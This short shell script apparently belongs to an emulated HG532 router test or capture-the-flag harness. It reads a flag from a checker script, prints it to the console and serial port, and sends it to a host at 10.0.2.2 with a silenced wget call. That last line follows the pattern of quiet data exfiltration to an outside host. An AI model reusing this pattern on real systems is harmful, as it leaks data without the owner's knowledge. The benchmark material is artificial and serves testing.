#!/bin/sh

FLAG="$("/bin/check_cache.sh")"

/bin/echo "__HG532_FLAG__${FLAG}" >/dev/console 2>/dev/null || true
/bin/echo "__HG532_FLAG__${FLAG}" >/dev/ttyS0 2>/dev/null || true
/bin/echo "$FLAG" > /tmp/flag_out
/bin/busybox sync
/bin/busybox wget -qO- "http://10.0.2.2:39000/${FLAG}" >/dev/null 2>&1 || true
